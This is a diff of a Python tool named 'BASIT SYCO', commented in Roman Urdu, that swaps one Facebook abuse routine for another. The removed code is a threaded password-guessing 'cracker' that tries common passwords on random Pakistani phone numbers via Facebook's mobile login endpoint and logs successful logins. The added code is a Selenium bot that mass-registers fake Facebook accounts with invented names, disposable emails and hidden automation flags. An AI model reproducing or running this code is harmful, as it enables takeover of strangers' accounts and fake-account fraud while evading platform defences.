@@ -1,87 +1,102 @@
 import os, sys, time, random, re
 try:
     import requests
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.chrome.service import Service
+    from webdriver_manager.chrome import ChromeDriverManager
 except ImportError:
-    os.system('pip install requests')
-    import requests
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    os.system('pip install requests selenium webdriver-manager')
+    print("Zaroori files install ho rahi hain... Tool restart karein.")
+    sys.exit()
 
-# --- Real Headers (Mobile Device Simulation) ---
-def get_headers():
-    return {
-        'authority': 'm.facebook.com',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://m.facebook.com',
-        'referer': 'https://m.facebook.com/',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    }
+# --- Automatic Data Generator ---
+eng_first = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
+eng_last = ["Smith", "Brown", "Wilson", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin"]
+
+def generate_temp_email():
+    """Tool khud se naya email banaye ga"""
+    random_user = "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=8))
+    domains = ["@mail7.io", "@chapsmail.com", "@instaddr.win", "@vintomaper.com"]
+    return random_user + random.choice(domains)
+
+def start_master_reg():
+    os.system('clear')
+    print("\033[1;92m--- BASIT SYCO AUTO-REG (TEMP-MAIL MODE) ---")
+    print("\033[1;37mStatus: Full Automatic English IDs")
+    print("-------------------------------------------")
+    
+    try:
+        count = int(input("[+] Kitni IDs banani hain?: "))
+        fixed_pass = input("[+] Password jo har ID par lagay: ")
+        
+        # Selenium Setup for PC
+        options = webdriver.ChromeOptions()
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        
+        print("\n\033[1;94m[!] Chrome khul raha hai... Tayyar rahain.")
+        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+
+        for i in range(count):
+            f_name = random.choice(eng_first)
+            l_name = random.choice(eng_last)
+            email = generate_temp_email() # Automatic Email
+            
+            print(f"\n\033[1;32m[{i+1}] Making ID for: {f_name} {l_name}")
+            print(f"\033[1;37mEmail Used: {email}")
+            
+            driver.get("https://m.facebook.com/reg/")
+            time.sleep(random.randint(4, 7))
+            
+            try:
+                # Filling Details
+                driver.find_element(By.NAME, "firstname").send_keys(f_name)
+                driver.find_element(By.NAME, "lastname").send_keys(l_name)
+                driver.find_element(By.NAME, "reg_email__").send_keys(email)
+                driver.find_element(By.NAME, "reg_passwd__").send_keys(fixed_pass)
+                
+                # DOB
+                driver.find_element(By.ID, "day").send_keys(str(random.randint(1,28)))
+                driver.find_element(By.ID, "month").send_keys(str(random.randint(1,12)))
+                driver.find_element(By.ID, "year").send_keys(str(random.randint(1992, 2004)))
+                
+                print("\033[1;33m[!] Form bhar diya gaya hai. Signup par click karein.")
+                print("\033[1;37mAgar OTP maangay to Temp-mail site check karein.")
+                
+                # Save data for record
+                with open('created_ids.txt', 'a') as f:
+                    f.write(f"Name: {f_name} {l_name} | Email: {email} | Pass: {fixed_pass}\n")
+                
+                # Wait for you to see what happened
+                time.sleep(20) 
+                
+            except Exception as e:
+                print(f"\033[1;31m[!] Error: {e}")
+                
+        driver.quit()
+        print("\n\033[1;92mSaara kaam khatam ho gaya!")
+        
+    except Exception as e:
+        print(f"\033[1;31m[!] Galti: {e}")
 
 def menu():
     os.system('clear')
-    print("\033[1;92m--- BASIT SYCO REAL CRACKER ---")
-    print("\033[1;37mConfirm Method: Mobile API Request")
-    print("-----------------------------------")
-    print("[1] Random Number Cloning (Pakistan)")
+    print("\033[1;32m  ____                _ _   ")
+    print(" | __ )  __ _ ___(_) |_ ")
+    print(" |  _ \ / _` / __| | __|")
+    print(" | |_) | (_| \__ \ | |_ ")
+    print(" |____/ \__,_|___/_|\__| Master Tool")
+    print("\n\033[1;37m[1] Start Auto Creation (PC - Selenium)")
+    print("[2] Update Tool (Git Pull)")
     print("[0] Exit")
-    opt = input("\nSelect Option: ")
-    if opt == '1':
-        real_start()
-    else:
-        sys.exit()
-
-def real_start():
-    os.system('clear')
-    print("\033[1;32mExample: 0300, 0301, 0345")
-    code = input("\033[1;37mEnter Network Code: ")
-    print("\033[1;32mExample: 1000, 2000, 5000")
-    limit = int(input("\033[1;37mHow many IDs to check?: "))
     
-    print("\n\033[1;94m--- Cloning Started (Real Mode) ---")
-    print("\033[1;31mNote: Use Aeroplane Mode after 100 IDs\n")
-    
-    with ThreadPool(max_workers=30) as pool:
-        for _ in range(limit):
-            num = code + str(random.randint(1111111, 9999999))
-            pwx = [num, "pakistan", "khan123", "khan786"] 
-            pool.submit(login_check, num, pwx)
-
-def login_check(num, pwx):
-    for pas in pwx:
-        try:
-            session = requests.Session()
-            # Step 1: Get Login Page
-            free_fb = session.get('https://m.facebook.com').text
-            
-            # Step 2: Extract Security Tokens
-            lsd = re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)
-            jazoest = re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1)
-            
-            data = {
-                "lsd": lsd,
-                "jazoest": jazoest,
-                "email": num,
-                "pass": pas,
-                "login": "Log In"
-            }
-            
-            # Step 3: Post Real Login Request
-            response = session.post('https://m.facebook.com/login/device-based/regular/login/', data=data, headers=get_headers(), allow_redirects=False)
-            
-            if "c_user" in session.cookies.get_dict():
-                print(f"\r\033[1;92m[BASIT-OK] {num} | {pas}      ")
-                open('ok.txt', 'a').write(num+'|'+pas+'\n')
-                break
-            elif "checkpoint" in session.cookies.get_dict():
-                print(f"\r\033[1;93m[BASIT-CP] {num} | {pas} (Check ID) ")
-                break
-            else:
-                sys.stdout.write(f"\r\033[1;37m[Checking] {num} | {pas} ")
-                sys.stdout.flush()
-        except:
-            pass
+    choice = input("\nSelect: ")
+    if choice == '1': start_master_reg()
+    elif choice == '2': 
+        os.system('git pull')
+        print("Updated!"); time.sleep(1); os.system('python basitsyco.py')
+    else: sys.exit()
 
 if __name__ == "__main__":
     menu()
